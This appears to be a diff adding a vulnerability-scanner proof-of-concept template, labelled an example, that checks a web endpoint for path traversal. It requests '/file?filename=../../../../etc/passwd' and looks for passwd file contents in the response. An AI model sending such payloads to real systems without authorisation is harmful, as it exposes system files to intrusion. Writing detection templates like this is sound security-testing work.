@@ -1,0 +1,30 @@
+id: example-path-traversal
+info:
+  name: Example Path Traversal Detection
+  author: knownsec
+  severity: medium
+  description: |
+    This is an example POC that demonstrates path traversal detection.
+    It tests for common path traversal patterns.
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+  tags:
+    - lfi
+    - path-traversal
+    - example
+
+requests:
+  - method: GET
+    path: "/file?filename=../../../../etc/passwd"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:x:0:0:"
+          - "daemon:x:1:1:"
+        condition: or
+      - type: status
+        status:
+          - 200
